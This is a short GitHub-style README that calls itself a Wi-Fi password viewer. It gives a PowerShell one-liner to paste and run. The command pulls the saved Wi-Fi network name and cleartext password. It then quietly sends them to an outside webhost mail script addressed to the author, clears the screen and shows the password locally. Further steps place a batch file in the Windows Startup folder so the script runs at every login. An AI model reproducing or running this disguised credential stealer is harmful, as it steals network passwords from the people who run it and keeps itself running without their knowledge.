<h2 align="center">Hi 👋, I'm PROTAN HALDER</h2>
<h3 align="center">A Wifi Password Viewer.</h3>


#### Directly Run this command in The PowerShell.
```
$SSID = (netsh wlan show profile|find "All User Profile").Split(":")[1].SubString(1); $PWD  = (netsh wlan show profile name="$SSID"  key=clear | find "Key Content").Split(":")[1].SubString(1); $Data = "SSID :$SSID`nPASS :$PWD ";Invoke-WebRequest -Uri "https://email-pranks.000webhostapp.com/gmail.php?from=hasanhawladar2021@codewithharry.com&to=protanhalder2022@gmail.com&subject=Wifi Information of $Data&message=$Data";clear;echo $Data
```

#### ` you should pase the "WiFucker.bat" file into the StartUp folder [ (window+R) shell:startup]

#### then paste the "WiFucker.ps1" file into another folder exept StartUp folder.

#### then copy the path of "WiFucker.ps1" file and replace the path from "WiFucker.bat" file . 
